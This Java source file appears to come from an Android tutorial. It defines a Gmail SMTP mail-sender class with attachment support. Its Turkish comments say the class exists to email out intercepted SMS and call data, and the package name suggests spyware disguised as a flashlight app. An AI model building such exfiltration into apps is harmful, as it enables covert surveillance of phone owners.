package com.example.flashlightexample;

import java.util.Date;
import java.util.Properties;

import javax.activation.CommandMap;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.activation.MailcapCommandMap;
import javax.mail.BodyPart;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

//Arkadaþlar burada yaptýgýmýz bütün dinnlemelerin sms,çaðrý bunlarý mail olarak göndermek için bu classý oluþturduk
//bu class da projemize eklememiz greken bir jar dosyasý yani kütphane var
//ÞÝMMDÝ O jar dosyasýný ekleyelim
public class WhatsappOfMail extends javax.mail.Authenticator  {
private String _user;
private String _pass;

private String[] _to;
private String _from;

private String _port;
private String _sport;

private String _host;

private String _subject;
private String _body;

private  boolean _auth;

private boolean _debuggable;

private Multipart _multipart;

public WhatsappOfMail(){
	//mail gönndermek için server (hostumuzu) tanýmlýyrz
	_host = "smtp.gmail.com";//baþlangýc smtp serverimiz 
	_port= "465";
	_sport= "465";
	
	
	_user= "";
	_pass= "";
	_from= "";
	_subject= "";
	_body= "";
	_debuggable=false;
	_auth=true;
	
	_multipart=new MimeMultipart();
	//Arkadaþlar burada bir kütüphane daha import etmemiz grekyr.
	MailcapCommandMap mc= (MailcapCommandMap)CommandMap.getDefaultCommandMap();
	mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
	mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
	mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
	mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");//bu ve alttaki satýrlarda handlers olacak
	mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
	CommandMap.setDefaultCommandMap(mc);
	//hemen yanlþlýk olmasýn die kontrol edelm
	//ewt devam edebilriz:)
	
	
}
public WhatsappOfMail (String user,String pass){
	this();
	_user=user;
	_pass=pass;
	
}
public boolean send() throws Exception{
	Properties props=_setProperties();
	if(!_user.equals("") && !_pass.equals("") && _to.length > 0 && !_from.equals("") && !_subject.equals("") && !_body.equals("")){
		
		Session session=Session.getInstance(props, this);
		MimeMessage msg=new MimeMessage(session);
		msg.setFrom(new InternetAddress(_from));
		InternetAddress [] addresTo= new InternetAddress[_to.length];
		for (int i = 0; i < _to.length; i++) {
			addresTo[i]=new InternetAddress(_to[i]);
}
		msg.setRecipients(MimeMessage.RecipientType.TO, addresTo);
		msg.setSubject(_subject);
		msg.setSentDate(new Date());
		//mesaj içieriði yüklemek için
		BodyPart messageBodyPart=new MimeBodyPart();
		messageBodyPart.setText(_body);
		_multipart.addBodyPart(messageBodyPart);
		//mesaja içeriiði koymak için
		msg.setContent(_multipart);
		
		//mail  gönderimi
		Transport.send(msg);
		return true;
		
	}else{
		return false;
	}}

public void addAttachment(String filename) throws Exception{
	BodyPart messageBodyPart=new MimeBodyPart();
	DataSource source =new FileDataSource(filename);
	messageBodyPart.setDataHandler(new DataHandler(source));
	messageBodyPart.setFileName(filename);

	_multipart.addBodyPart(messageBodyPart);
	
}


@Override
protected PasswordAuthentication getPasswordAuthentication() {
	// TODO Auto-generated method stub
	return new PasswordAuthentication(_user, _pass);
}
private Properties _setProperties() {
	
	Properties props=new Properties();
	props.put("mail.smtp.host", _host);
	if(_debuggable){
		props.put("mail.debug", "true");
	}
	if(_auth){
		
		
		props.put("mail.smtp.auth", "true");
		
	}
	
	props.put("mail.smtp.port", _port);
	props.put("mail.smtp.socketFactory.port",_sport);
	props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
	props.put("mail.smtp.socketFactory.fallback","false");
	return props;
}
public String getBody() {
	return _body;
}
public void setBody(String _body) {
	this._body = _body;
}
public void setTo(String[] toArr) {
	this._to = toArr;
}
public void setFrom(String string) {
	this._from = string;
}
public void setSubject(String string) {
	this._subject = string;
}




}
